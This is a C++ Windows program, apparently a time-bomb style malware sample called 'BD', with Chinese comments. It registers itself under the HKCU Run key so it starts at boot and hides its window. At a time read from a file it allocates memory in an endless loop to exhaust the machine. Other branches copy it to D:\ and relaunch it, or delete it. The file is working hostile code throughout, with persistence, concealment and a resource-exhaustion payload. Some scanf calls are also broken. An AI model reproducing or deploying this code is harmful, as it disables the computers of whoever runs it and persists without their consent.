#include<iostream>
#include<cstdio>
#include<ctime>
#include<windows.h>
using namespace std;
// 程序开机自动启动
void AS()
{
    HKEY hKey;
    string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    //1、找到系统的启动项  
    if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///打开启动项       
    {
        //2、得到本程序自身的全路径
        TCHAR strExeFullDir[MAX_PATH];
        GetModuleFileName(NULL, strExeFullDir, MAX_PATH);

        //3、判断注册表项是否已经存在

        //4、已经存在
        //5、添加一个子Key,并设置值，"BD"是应用程序名字（不加后缀.exe） 
        RegSetValueEx(hKey, "BD", 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1)*sizeof(TCHAR));

        //6、关闭注册表
        RegCloseKey(hKey);
    }
}

// 取消开机自动启动
void CAS()
{
    HKEY hKey;
    string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    //1、找到系统的启动项  
    if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        //2、删除值
        RegDeleteValue(hKey, "BD");

        //3、关闭注册表
        RegCloseKey(hKey);
    }
}
int day,hour,min_,year,month,sec;
void get_time()
{
	time_t now=(time(0)+3600*8);
	tm a=*gmtime(&now);
	year=a.tm_year+1900;
	month=a.tm_mon+1;
	day=a.tm_mday;
	hour=a.tm_hour;
	min_=a.tm_min;
	sec=a.tm_sec;
	if(hour<8) ++day;
	return;
}
int main()
{
	printf("Start Success!Please wait 5s");
	Sleep(5000); 
	printf("\nWait end");
	HWND hwnd=GetForegroundWindow();
	ShowWindow(hwnd,0);
	int Y=-1,M=-1,D=-1,H=-1,Min=-1,S=-1;
	freopen("time.txt","r",stdin);
	scanf("%d%d%d%d%d%d",Y,M,D,H,Min,S);
	fclose(stdin);
	/**/if(freopen("data","r",stdin)==NULL)
	{
		loop:
		fclose(stdin);
		freopen("data","w",stdout);
		printf("%d",0);
		fclose(stdout); 
		freopen("data","r",stdin);
		AS();
	}
	int x;
	scanf("%d",&x);
	if(x==3) goto loop;
	else if(!x)//BONE! 
	{
		get_time();
		while(year<Y||month<M||day<D||hour<H||min_<Min||sec<S) get_time();
//		printf("%d-%d-%d",day,hour,min_); 
		fclose(stdin);
		freopen("data","w",stdout);
		printf("%d",1); 
		while(1) new(long double);
	}
	else if(x==1)//自毁 
	{
		CAS();
		system("del data");
		system("del BD.exe"); 
	}
	else if(x==2)//植入 
	{
		fclose(stdin);
		freopen("data","w",stdout);
		printf("%d",3);
		system("copy BD.exe D:\\BD.exe");
		ShellExecute(NULL,"open","D:\\BD.exe",NULL,NULL,SW_SHOWNORMAL);
		exit(0); 
	}
	return 0;
}

